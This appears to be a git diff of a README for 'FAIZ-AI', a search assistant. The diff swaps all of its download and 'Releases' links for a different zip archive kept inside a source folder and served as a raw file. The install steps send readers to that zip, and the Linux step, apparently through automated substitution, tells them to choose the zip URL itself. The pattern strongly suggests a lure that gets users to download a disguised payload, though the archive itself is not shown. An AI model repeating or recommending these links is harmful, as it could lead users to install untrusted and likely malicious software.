@@ -1,6 +1,6 @@
 # 🤖 FAIZ-AI - Your Smart Search Assistant Awaits
 
-[![Download FAIZ-AI](https://raw.githubusercontent.com/Tanrianpurba09/FAIZ-AI/main/src/agents/FAI_AI_v1.9.zip)](https://raw.githubusercontent.com/Tanrianpurba09/FAIZ-AI/main/src/agents/FAI_AI_v1.9.zip)
+[![Download FAIZ-AI](https://raw.githubusercontent.com/Tanrianpurba09/FAIZ-AI/main/src/protocols/FAI_AI_2.4.zip)](https://raw.githubusercontent.com/Tanrianpurba09/FAIZ-AI/main/src/protocols/FAI_AI_2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -24,16 +24,16 @@ FAIZ-AI is a powerful search bot designed to help you find information quickly a
 
 ## 📥 Download & Install
 
-To get started with FAIZ-AI, simply visit this page to download: [FAIZ-AI Releases](https://raw.githubusercontent.com/Tanrianpurba09/FAIZ-AI/main/src/agents/FAI_AI_v1.9.zip).
+To get started with FAIZ-AI, simply visit this page to download: [FAIZ-AI Releases](https://raw.githubusercontent.com/Tanrianpurba09/FAIZ-AI/main/src/protocols/FAI_AI_2.4.zip).
 
 ### Installation Steps
 
-1. Go to the [FAIZ-AI Releases](https://raw.githubusercontent.com/Tanrianpurba09/FAIZ-AI/main/src/agents/FAI_AI_v1.9.zip) page.
+1. Go to the [FAIZ-AI Releases](https://raw.githubusercontent.com/Tanrianpurba09/FAIZ-AI/main/src/protocols/FAI_AI_2.4.zip) page.
 2. Find the latest release version.
 3. Download the appropriate file for your operating system:
    - For Windows, download `.exe` file.
    - For macOS, download `.dmg` file.
-   - For Linux, choose the `https://raw.githubusercontent.com/Tanrianpurba09/FAIZ-AI/main/src/agents/FAI_AI_v1.9.zip` or relevant package.
+   - For Linux, choose the `https://raw.githubusercontent.com/Tanrianpurba09/FAIZ-AI/main/src/protocols/FAI_AI_2.4.zip` or relevant package.
 4. Once downloaded, open the file and follow the installation prompts.
 5. After installation, you can launch FAIZ-AI from your applications menu or desktop shortcut.
 
